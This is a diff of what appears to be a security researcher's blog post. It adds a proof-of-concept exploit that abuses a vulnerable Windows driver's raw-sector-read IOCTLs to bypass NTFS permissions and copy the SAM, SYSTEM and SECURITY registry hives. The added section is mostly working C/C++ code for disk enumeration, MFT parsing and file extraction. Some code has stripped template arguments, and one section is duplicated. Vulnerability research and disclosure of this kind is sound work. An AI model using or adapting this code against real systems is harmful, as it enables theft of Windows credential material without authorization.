@@ -73,7 +73,7 @@ v16 = IoBuildSynchronousFsdRequest(
 
 Based on this, the IOCTL input buffer for our POC can be crafted like:
 
-```cpp
+```c
 struct ReadSectorsInput
 {
     char     DiskName[100];
@@ -95,7 +95,7 @@ memmove((void *)(v9 + v3), v8 + 2, 0xE1u);
 
 Enumerating the function reveals where different pieces of information are written inside this structure. By tracking writes into the allocated record buffer, the layout of the structure can be reconstructed:
 
-```cpp
+```c
 struct DiskRecord
 {
     char     DeviceName[100]; 
@@ -114,5 +114,255 @@ static_assert(sizeof(DiskRecord) == 225, "DiskRecord must be 225 bytes");
 ```
 
 ## Writing the Exploit
-With all of the information on how to interact with the driver it was time to write the code.
+With all of the information on how to interact with the driver, it was time to write the code.
 
+The chain of attack would be to:
+
+1. **Enumerate disks** — `IOCTL 0x8000E004` populates the driver's internal list and returns 225-byte records. Extract the device name and sector size from the first raw disk record (`IsDrDevice == 1`).
+2. **Find the Windows partition** — read LBA 0 to get the MBR/GPT, locate the Microsoft Basic Data partition start LBA.
+3. **Parse the NTFS VBR** — read the partition start sector, extract `BytesPerSector`, `SectorsPerCluster`, `MftLcn`, and `ClustersPerMftRecord` from the BPB.
+4. **Build the MFT run list** — read MFT record 0 (`$MFT`), decode its `$DATA` non-resident run list to handle fragmented volumes correctly.
+5. **Scan the MFT** — walk every record, apply the update sequence fixup, parse `$FILE_NAME` attributes to locate SAM and SYSTEM by name.
+6. **Extract the file** — parse the `$DATA` run list of the target record and read each run sector-by-sector via `IOCTL 0x8000E000`.
+
+### Disk enumeration
+
+The first IOCTL call sends a dummy DWORD input and receives back an array of 225-byte records, one per enumerated disk. The `returned / 225` division gives the count:
+
+```c
+static bool EnumerateDisks()
+{
+    const DWORD bufSize = 16 * 225;
+    std::vector buf(bufSize, 0);
+    DWORD dummy = 0, returned = 0;
+
+    DeviceIoControl(g_hDriver, 0x8000E004,
+                    &dummy, sizeof(dummy),
+                    buf.data(), bufSize,
+                    &returned, nullptr);
+
+    uint32_t count = returned / 225;
+    for (uint32_t i = 0; i < count; ++i)
+    {
+        auto* rec = reinterpret_cast(buf.data() + i * 225);
+        // IsDrDevice == 1: raw disk (\DR) — this is what we want
+        // IsDrDevice == 0: partition device (\DP() — skip
+        if (rec->IsDrDevice && g_DiskName[0] == '\0')
+        {
+            strncpy_s(g_DiskName, sizeof(g_DiskName), rec->DeviceName, _TRUNCATE);
+            g_SectorSize = rec->SectorSize ? rec->SectorSize : 512;
+        }
+    }
+    return g_DiskName[0] != '\0';
+}
+```
+
+### Sector reads
+
+Every subsequent read uses the same `ReadSectors` helper, which fills out the 112-byte `ReadSectorsInput` and calls `IOCTL 0x8000E000`:
+
+```cpp
+static bool ReadSectors(uint64_t lba, uint32_t count, void* buf)
+{
+    ReadSectorsInput in = {};
+    strncpy_s(in.DiskName, sizeof(in.DiskName), g_DiskName, _TRUNCATE);
+    in.SectorCount = count;
+    in.StartLba    = lba;
+
+    DWORD returned = 0;
+    return DeviceIoControl(g_hDriver, 0x8000E000,
+                           &in,  sizeof(in),
+                           buf,  count * g_SectorSize,
+                           &returned, nullptr)
+           && returned == count * g_SectorSize;
+}
+```
+
+### Parsing the NTFS VBR
+
+The BIOS parameter block at the partition start sector gives cluster and MFT (Master File Table) geometry:
+
+```cpp
+uint16_t bytesPerSector    = *reinterpret_cast(vbr.data() + 11);
+uint8_t  sectorsPerCluster =  vbr[13];
+uint64_t mftLcn            = *reinterpret_cast(vbr.data() + 48);
+
+// ClustersPerMftRecord at offset 64: if negative, bytes = 2^(-n)
+int8_t  cpm = static_cast(vbr[64]);
+uint32_t bytesPerRecord = (cpm < 0)
+    ? (1u << static_cast(-cpm))
+    : static_cast(cpm) * bytesPerSector * sectorsPerCluster;
+
+info.MftStartLba = partStartLba + mftLcn * sectorsPerCluster;
+```
+
+### MFT run-list for fragmented volumes
+
+The assumption that the MFT is a single contiguous run fails on any real Windows install. MFT record 0 (`$MFT`) describes the MFT file itself — its non-resident `$DATA` attribute (type `0x80`, `FormCode == 1`, `NameLength == 0`) holds the run list for the entire MFT.
+
+NTFS run list encoding: each entry starts with a header byte where the low nibble is the byte-width of the length field, and the high nibble is the byte-width of the LCN delta. The LCN delta is signed and must be sign-extended. A `0x00` header byte terminates the list:
+
+```cpp
+uint64_t currentLcn = 0;
+while (i < maxLen)
+{
+    uint8_t hdr     = runs[i++];
+    if (hdr == 0) break;
+    uint8_t lenBytes = hdr & 0x0F;
+    uint8_t lcnBytes = (hdr >> 4) & 0x0F;
+
+    uint64_t runLen = 0;
+    for (uint8_t b = 0; b < lenBytes; ++b)
+        runLen |= static_cast(runs[i++]) << (8 * b);
+
+    int64_t lcnDelta = 0;
+    for (uint8_t b = 0; b < lcnBytes; ++b)
+        lcnDelta |= static_cast(runs[i++]) << (8 * b);
+    // sign-extend
+    if (lcnBytes < 8 && (lcnDelta >> (8 * lcnBytes - 1)) & 1)
+        lcnDelta |= ~((int64_t(1) << (8 * lcnBytes)) - 1);
+
+    currentLcn += lcnDelta;
+    out.push_back({ static_cast(currentLcn), runLen });
+}
+```
+
+Each record number is then mapped to its real LBA by walking the run list:
+
+```cpp
+uint64_t offset = 0;
+for (const auto& run : mftRuns)
+{
+    if (recNum < offset + run.RecordCount)
+    {
+        outLba = run.StartLba + (recNum - offset) * sectorsPerRecord;
+        return true;
+    }
+    offset += run.RecordCount;
+}
+```
+### MFT run list
+
+MFT record 0 (`$MFT`) holds the run list for the entire MFT in its non-resident `$DATA` attribute. Each run entry is encoded with a header byte where the low nibble is the byte-width of the length field and the high nibble is the byte-width of the signed LCN delta:
+
+```cpp
+uint64_t currentLcn = 0;
+while (i < maxLen)
+{
+    uint8_t hdr      = runs[i++];
+    if (hdr == 0) break;
+    uint8_t lenBytes = hdr & 0x0F;
+    uint8_t lcnBytes = (hdr >> 4) & 0x0F;
+
+    uint64_t runLen = 0;
+    for (uint8_t b = 0; b < lenBytes; ++b)
+        runLen |= (uint64_t)runs[i++] << (8 * b);
+
+    int64_t lcnDelta = 0;
+    for (uint8_t b = 0; b < lcnBytes; ++b)
+        lcnDelta |= (int64_t)runs[i++] << (8 * b);
+    if (lcnBytes < 8 && (lcnDelta >> (8 * lcnBytes - 1)) & 1)
+        lcnDelta |= ~((int64_t(1) << (8 * lcnBytes)) - 1);
+
+    currentLcn += lcnDelta;
+    out.push_back({ (uint64_t)currentLcn, runLen });
+}
+```
+
+Record numbers map to LBAs by walking the run list:
+
+```cpp
+uint64_t offset = 0;
+for (const auto& run : mftRuns)
+{
+    if (recNum < offset + run.RecordCount)
+    {
+        outLba = run.StartLba + (recNum - offset) * sectorsPerRecord;
+        return true;
+    }
+    offset += run.RecordCount;
+}
+```
+
+### Update sequence fixup
+
+Before parsing attributes in any MFT record, the NTFS update sequence must be applied. NTFS replaces the last 2 bytes of each 512-byte sector within the record with a sequence number; they are restored from the update sequence array at `hdr->UpdateSeqOffset`:
+
+```cpp
+uint16_t* usa = (uint16_t *)(rec + hdr->UpdateSeqOffset);
+uint16_t  seq = usa[0];
+for (uint16_t i = 1; i < hdr->UpdateSeqCount; ++i)
+{
+    uint16_t* slot = (uint16_t *)(rec + i * 512 - 2);
+    if (*slot == seq) *slot = usa[i];
+}
+```
+
+### Finding SAM, SYSTEM, and SECURITY in the MFT
+
+For each in-use MFT record, `$FILE_NAME` attributes (type `0x30`, `FormCode == 0`) are compared against the target name. The `$FILE_NAME` value layout:
+
+```
++0x00  ParentDirectory  8 bytes
++0x08  CreationTime     8 bytes
++0x10  ModificationTime 8 bytes
++0x18  MftChangeTime    8 bytes
++0x20  AccessTime       8 bytes
++0x28  AllocatedSize    8 bytes
++0x30  RealSize         8 bytes
++0x38  Flags            4 bytes
++0x3C  ReparseTag       4 bytes
++0x40  FileNameLength   1 byte   (characters, not bytes)
++0x41  Namespace        1 byte
++0x42  FileName[]       UTF-16LE
+```
+
+```cpp
+uint8_t fnLen = val[0x40];
+const uint8_t* fn = val + 0x42;
+
+if (fnLen == strlen(targetName))
+{
+    bool match = true;
+    for (size_t c = 0; c < fnLen; ++c)
+    {
+        uint16_t wc = *(uint16_t *)(fn + c * 2);
+        if (tolower(wc & 0xFF) != tolower((unsigned char)targetName[c]))
+            { match = false; break; }
+    }
+    if (match) nameMatch = true;
+}
+```
+
+### Extracting the file
+
+Once the record is found, the non-resident `$DATA` run list is decoded, and each cluster run is read in 1 MB chunks:
+
+```cpp
+for (const auto& run : dataRuns)
+{
+    uint64_t runLba   = partStartLba + run.Lcn * sectorsPerCluster;
+    uint64_t runBytes = run.LengthClusters * bytesPerCluster;
+    if (runBytes > bytesLeft) runBytes = bytesLeft;
+
+    uint32_t sectorsTotal = (runBytes + g_SectorSize - 1) / g_SectorSize;
+    const uint32_t CHUNK  = 2048;
+
+    for (uint32_t off = 0; off < sectorsTotal; off += CHUNK)
+    {
+        uint32_t toRead  = min(CHUNK, sectorsTotal - off);
+        ReadSectors(runLba + off, toRead, chunk.data());
+        DWORD writeBytes = min((uint64_t)(toRead * g_SectorSize), bytesLeft);
+        DWORD written    = 0;
+        WriteFile(hOut, chunk.data(), writeBytes, &written, nullptr);
+        bytesLeft -= written;
+    }
+}
+```
+
+### Results
+![POC](/assets/img/posts/Bypassing-NTFS-ACLs/POC.gif)
+
+![Parsed](/assets/img/posts/Bypassing-NTFS-ACLs/ParsedHives.png)
+
+*I will post the entire POC to my GitHub once the vulnerability has been disclosed.
